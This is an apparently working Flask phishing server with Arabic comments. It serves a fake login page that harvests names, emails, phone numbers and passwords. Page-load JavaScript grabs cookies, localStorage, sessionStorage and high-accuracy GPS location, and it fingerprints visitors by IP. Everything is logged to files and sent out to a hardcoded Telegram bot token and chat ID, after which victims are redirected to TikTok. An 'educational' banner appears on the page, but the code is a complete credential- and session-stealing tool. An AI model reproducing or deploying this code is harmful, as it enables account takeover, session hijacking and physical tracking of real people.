from flask import Flask, request, redirect, render_template_string
import datetime
import os
import requests

app = Flask(__name__)

# ========== إعدادات تليجرام وإعادة التوجيه ==========
TELEGRAM_BOT_TOKEN = "8155493968:AAG4EgYUasUC27VxMs1IPIEthR4jt1tYsmE"
TELEGRAM_CHAT_ID = "7810572372"
TIKTOK_REDIRECT_URL = "https://vt.tiktok.com/ZSVk69HTA/"

# ========== دالة الإرسال إلى تليجرام ==========
def send_to_telegram(message):
    """إرسال رسالة نصية إلى بوت التليجرام"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        r = requests.post(url, json=payload, timeout=5)
        return r.status_code == 200
    except Exception as e:
        print(f"خطأ في الإرسال لتليجرام: {e}")
        return False

# ========== الصفحة الرئيسية (وجهة الضحية) ==========
@app.route('/')
def index():
    # 1. جمع البيانات التقنية فوراً
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    accept_lang = request.headers.get('Accept-Language')
    
    # تخمين نظام التشغيل
    os_info = "غير معروف"
    if "Android" in user_agent:
        os_info = "📱 Android"
    elif "iPhone" in user_agent or "iPad" in user_agent:
        os_info = "📱 iOS"
    elif "Windows" in user_agent:
        os_info = "💻 Windows"
    elif "Mac" in user_agent:
        os_info = "🍎 Mac"
    
    # جلب الموقع التقريبي
    try:
        ip_response = requests.get(f'http://ip-api.com/json/{client_ip}?fields=status,country,city,lat,lon,isp')
        ip_data = ip_response.json()
        if ip_data['status'] == 'success':
            location = f"{ip_data.get('city', 'غير معروف')}, {ip_data.get('country', 'غير معروف')}"
            isp = ip_data.get('isp', 'غير معروف')
            lat = ip_data.get('lat', 'غير متاح')
            lon = ip_data.get('lon', 'غير متاح')
        else:
            location, isp, lat, lon = "غير متاح", "غير متاح", "غير متاح", "غير متاح"
    except:
        location, isp, lat, lon = "خطأ في الجلب", "خطأ في الجلب", "خطأ", "خطأ"
    
    # تسجيل البيانات التقنية في الملف
    log_entry = f"""
    ═══════════════════════════════════════════
    [زيارة جديدة] - {datetime.datetime.now()}
    🌐 IP: {client_ip}
    📍 الموقع التقريبي: {location}
    📡 مزود الخدمة: {isp}
    📱 نظام التشغيل: {os_info}
    🌍 اللغة: {accept_lang}
    📝 User-Agent: {user_agent}
    ═══════════════════════════════════════════
    """
    with open('log.txt', 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    # ====== إنشاء رابط خرائط جوجل ======
    maps_link = f"https://www.google.com/maps?q={lat},{lon}" if lat != 'غير متاح' and lat != 'خطأ' else "غير متاح"
    
    # إرسال البيانات التقنية إلى تليجرام مع رابط الخريطة
    tech_msg = f"""
<b>🆕 زيارة جديدة!</b>
<b>🌐 IP:</b> {client_ip}
<b>📍 الموقع التقريبي:</b> {location}
<b>🗺️ الإحداثيات:</b> {lat}, {lon}
<b>📍 <a href="{maps_link}">على الخريطة</a></b>
<b>📡 مزود الخدمة:</b> {isp}
<b>📱 نظام التشغيل:</b> {os_info}
<b>🌍 اللغة:</b> {accept_lang}
<b>📝 User-Agent:</b> {user_agent[:100]}...
"""
    send_to_telegram(tech_msg)
    
    # 2. إعادة التوجيه إلى صفحة تسجيل الدخول الوهمية
    return redirect('/login')

# ========== صفحة تسجيل الدخول الوهمية ==========
login_page_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>تسجيل الدخول - تجربة تعليمية</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
        h2 { color: #1a73e8; text-align: center; }
        .warning { background: #fff3cd; color: #856404; padding: 12px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; border: 1px solid #ffc107; text-align: center; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
        button:hover { background: #1557b0; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #888; }
        .field { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: 600; color: #333; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 تسجيل الدخول</h2>
        <div class="warning">
            ⚠️ هذه صفحة تعليمية لمحاكاة هجوم التصيد (Phishing)<br>
            سيتم تسجيل البيانات التي تدخلها لأغراض التعلم فقط
        </div>
        <form action="/capture" method="POST">
            <div class="field">
                <label>الاسم الكامل</label>
                <input type="text" name="fullname" placeholder="أدخل اسمك الكامل" required>
            </div>
            <div class="field">
                <label>البريد الإلكتروني</label>
                <input type="email" name="email" placeholder="example@email.com" required>
            </div>
            <div class="field">
                <label>رقم الهاتف</label>
                <input type="tel" name="phone" placeholder="05xxxxxxxx" required>
            </div>
            <div class="field">
                <label>كلمة المرور</label>
                <input type="password" name="password" placeholder="••••••••" required>
            </div>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <div class="footer">
            🔒 هذه تجربة تعليمية على خادم آمن
        </div>
    </div>
    <script>
    // دالة لطلب الموقع بصمت (بدون تحذيرات)
    function requestLocation() {
        if (navigator.geolocation) {
            let attempts = 0;
            const maxAttempts = 3;
            let bestAccuracy = Infinity;
            let bestLat = null;
            let bestLng = null;
            
            function getLocation() {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        
                        if (accuracy < bestAccuracy) {
                            bestAccuracy = accuracy;
                            bestLat = lat;
                            bestLng = lng;
                        }
                        
                        if (accuracy < 50 || attempts >= maxAttempts - 1) {
                            fetch('/gps-data', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ 
                                    lat: bestLat, 
                                    lng: bestLng, 
                                    accuracy: bestAccuracy 
                                })
                            }).catch(err => console.log('خطأ في إرسال GPS:', err));
                        } else {
                            attempts++;
                            setTimeout(getLocation, 2000);
                        }
                    },
                    function(error) {
                        if (attempts < maxAttempts) {
                            attempts++;
                            setTimeout(getLocation, 2000);
                        } else {
                            if (bestLat && bestLng) {
                                fetch('/gps-data', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ 
                                        lat: bestLat, 
                                        lng: bestLng, 
                                        accuracy: bestAccuracy || 9999 
                                    })
                                }).catch(err => console.log('خطأ في إرسال GPS:', err));
                            }
                        }
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            }
            
            getLocation();
        }
    }

    // جمع بيانات المتصفح الإضافية
    function collectBrowserData() {
        const data = {
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
            deviceMemory: navigator.deviceMemory || 'غير معروف',
            connectionType: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
            cookiesEnabled: navigator.cookieEnabled
        };
        
        fetch('/browser-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(err => console.log('خطأ في إرسال بيانات المتصفح:', err));
    }

    // ========== جمع الكوكيز والجلسات النشطة ==========
    function collectSensitiveData() {
        // 1. جمع الكوكيز
        const cookies = document.cookie;
        
        // 2. جمع localStorage و sessionStorage
        let localStorageData = {};
        let sessionStorageData = {};
        
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                localStorageData[key] = localStorage.getItem(key);
            }
        } catch(e) { console.log('خطأ في localStorage:', e); }
        
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                sessionStorageData[key] = sessionStorage.getItem(key);
            }
        } catch(e) { console.log('خطأ في sessionStorage:', e); }
        
        // 3. الصفحة السابقة
        const referrer = document.referrer || 'لا يوجد';
        
        // 4. تجميع البيانات
        const sessionData = {
            cookies: cookies,
            localStorage: localStorageData,
            sessionStorage: sessionStorageData,
            referrer: referrer,
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            colorDepth: window.screen.colorDepth,
            deviceMemory: navigator.deviceMemory || 'غير معروف',
            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
            connectionType: navigator.connection ? navigator.connection.effectiveType : 'غير معروف'
        };
        
        // إرسال البيانات إلى الخادم
        fetch('/collect-sensitive', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(sessionData)
        }).catch(err => console.log('خطأ في إرسال البيانات الحساسة:', err));
    }

    // استدعاء الدوال عند تحميل الصفحة
    window.onload = function() {
        setTimeout(requestLocation, 1000);
        collectBrowserData();
        collectSensitiveData(); // جمع الكوكيز والجلسات
    };
    </script>
</body>
</html>
'''

@app.route('/login')
def fake_login():
    return render_template_string(login_page_html)

# ========== مسار استقبال البيانات المسجلة ==========
@app.route('/capture', methods=['POST'])
def capture():
    fullname = request.form.get('fullname')
    email = request.form.get('email')
    phone = request.form.get('phone')
    password = request.form.get('password')
    
    # تسجيل البيانات المسروقة في الملف
    with open('captured_data.txt', 'a', encoding='utf-8') as f:
        f.write(f"""
        ═══════════════════════════════════════════
        📥 بيانات تم جمعها - {datetime.datetime.now()}
        👤 الاسم الكامل: {fullname}
        📧 البريد الإلكتروني: {email}
        📱 رقم الهاتف: {phone}
        🔑 كلمة المرور: {password}
        🌐 IP المصدر: {request.remote_addr}
        📱 User-Agent: {request.headers.get('User-Agent')}
        ═══════════════════════════════════════════
        """)
    
    # إرسال البيانات المسجلة إلى تليجرام
    captured_msg = f"""
<b>🔐 تم اختراق بيانات جديدة!</b>
<b>👤 الاسم الكامل:</b> {fullname}
<b>📧 البريد الإلكتروني:</b> {email}
<b>📱 رقم الهاتف:</b> {phone}
<b>🔑 كلمة المرور:</b> {password}
<b>🌐 IP المصدر:</b> {request.remote_addr}
"""
    send_to_telegram(captured_msg)
    
    # عرض صفحة شكر مع إعادة توجيه إلى تيك توك
    success_page = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>تم تسجيل الدخول</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {{ font-family: Arial; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f0f2f5; margin: 0; }}
            .box {{ background: white; padding: 40px; border-radius: 10px; text-align: center; max-width: 400px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
            h2 {{ color: #28a745; }}
            .warning {{ background: #fff3cd; padding: 15px; border-radius: 5px; color: #856404; margin-top: 20px; font-size: 14px; }}
        </style>
    </head>
    <body>
        <div class="box">
            <h2>✅ تم تسجيل الدخول بنجاح!</h2>
            <p>سيتم توجيهك إلى المحتوى المطلوب...</p>
            <div class="warning">
                ⚠️ هذه تجربة تعليمية. بياناتك تم تسجيلها في الخادم
            </div>
        </div>
        <script>
            setTimeout(() => {{
                window.location.href = '{TIKTOK_REDIRECT_URL}';
            }}, 3000);
        </script>
    </body>
    </html>
    '''
    return success_page

# ========== استقبال الموقع الدقيق (GPS) ==========
@app.route('/gps-data', methods=['POST'])
def gps_data():
    data = request.get_json()
    lat = data.get('lat')
    lon = data.get('lng')
    accuracy = data.get('accuracy')
    
    if lon is None or lat is None:
        error_msg = f"""
⚠️ <b>فشل تحديد الموقع بدقة</b>
📱 الأسباب المحتملة:
1. لم تسمح بمشاركة الموقع في المتصفح
2. إشارة GPS ضعيفة (جرب في مكان مفتوح)

📝 البيانات المستلمة:
خط العرض: {lat}
خط الطول: {lon}
الدقة: {accuracy} متر
"""
        send_to_telegram(error_msg)
        return {"status": "failed", "reason": "GPS location unavailable"}, 400
    
    with open('gps_log.txt', 'a', encoding='utf-8') as f:
        f.write(f"""
        ═══════════════════════════════════════════
        📍 موقع دقيق - {datetime.datetime.now()}
        🗺️ خط العرض: {lat}
        🗺️ خط الطول: {lon}
        📏 الدقة: {accuracy} متر
        🌐 IP: {request.remote_addr}
        ═══════════════════════════════════════════
        """)
    
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    gps_msg = f"""
<b>📍 موقع دقيق (GPS)</b>
<b>🗺️ خط العرض:</b> {lat}
<b>🗺️ خط الطول:</b> {lon}
<b>📏 الدقة:</b> {accuracy} متر
<b>📍 <a href="{maps_link}">على الخريطة</a></b>
    """
    send_to_telegram(gps_msg)
    
    return {"status": "success"}, 200

# ========== استقبال بيانات المتصفح ==========
@app.route('/browser-data', methods=['POST'])
def browser_data():
    data = request.get_json()
    
    browser_msg = f"""
<b>🖥️ بيانات المتصفح الإضافية</b>
<b>📐 دقة الشاشة:</b> {data.get('screenWidth')}x{data.get('screenHeight')}
<b>🕐 المنطقة الزمنية:</b> {data.get('timezone')}
<b>🌐 اللغة:</b> {data.get('language')}
<b>💻 المنصة:</b> {data.get('platform')}
<b>⚙️ عدد الأنوية:</b> {data.get('hardwareConcurrency')}
<b>🧠 الذاكرة:</b> {data.get('deviceMemory')} جيجابايت
<b>📶 نوع الاتصال:</b> {data.get('connectionType')}
<b>🍪 ملفات تعريف الارتباط:</b> {data.get('cookiesEnabled')}
    """
    send_to_telegram(browser_msg)
    
    return {"status": "success"}, 200

# ========== استقبال البيانات الحساسة (كوكيز، جلسات) ==========
@app.route('/collect-sensitive', methods=['POST'])
def collect_sensitive():
    data = request.get_json()
    
    # تسجيل البيانات الحساسة في ملف
    with open('sensitive_data.txt', 'a', encoding='utf-8') as f:
        f.write(f"""
        ═══════════════════════════════════════════
        📥 بيانات حساسة - {datetime.datetime.now()}
        🍪 الكوكيز: {data.get('cookies', 'لا يوجد')}
        💾 LocalStorage: {data.get('localStorage', {})}
        💾 SessionStorage: {data.get('sessionStorage', {})}
        🔗 الصفحة السابقة: {data.get('referrer', 'لا يوجد')}
        📱 اللغة: {data.get('language', 'غير معروف')}
        🕐 المنطقة الزمنية: {data.get('timezone', 'غير معروف')}
        📐 دقة الشاشة: {data.get('screenWidth')}x{data.get('screenHeight')}
        📶 نوع الاتصال: {data.get('connectionType', 'غير معروف')}
        ═══════════════════════════════════════════
        """)
    
    # إرسال إلى تليجرام
    sensitive_msg = f"""
<b>🍪 بيانات حساسة تم جمعها</b>
<b>🍪 الكوكيز:</b> {data.get('cookies', 'لا يوجد')[:200]}...
<b>💾 LocalStorage:</b> {len(data.get('localStorage', {}))} عنصر
<b>💾 SessionStorage:</b> {len(data.get('sessionStorage', {}))} عنصر
<b>🔗 الصفحة السابقة:</b> {data.get('referrer', 'لا يوجد')}
<b>📱 اللغة:</b> {data.get('language', 'غير معروف')}
<b>🕐 المنطقة الزمنية:</b> {data.get('timezone', 'غير معروف')}
"""
    send_to_telegram(sensitive_msg)
    
    return {"status": "success"}, 200

# ========== عرض السجلات (للمختبر) ==========
@app.route('/view-logs')
def view_logs():
    output = "<html><head><title>السجلات</title><style>body{background:#1e1e1e;color:#d4d4d4;padding:20px;font-family:monospace;}</style></head><body>"
    try:
        with open('log.txt', 'r', encoding='utf-8') as f:
            output += "<h2>📊 السجلات التقنية</h2><pre>" + f.read() + "</pre>"
    except:
        output += "<p>لا توجد سجلات تقنية</p>"
    try:
        with open('captured_data.txt', 'r', encoding='utf-8') as f:
            output += "<h2>🔐 البيانات المسجلة</h2><pre>" + f.read() + "</pre>"
    except:
        output += "<p>لا توجد بيانات مسجلة</p>"
    try:
        with open('gps_log.txt', 'r', encoding='utf-8') as f:
            output += "<h2>📍 بيانات GPS</h2><pre>" + f.read() + "</pre>"
    except:
        output += "<p>لا توجد بيانات GPS</p>"
    try:
        with open('sensitive_data.txt', 'r', encoding='utf-8') as f:
            output += "<h2>🍪 البيانات الحساسة (كوكيز، جلسات)</h2><pre>" + f.read() + "</pre>"
    except:
        output += "<p>لا توجد بيانات حساسة</p>"
    output += "</body></html>"
    return output

# ========== تشغيل الخادم ==========
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
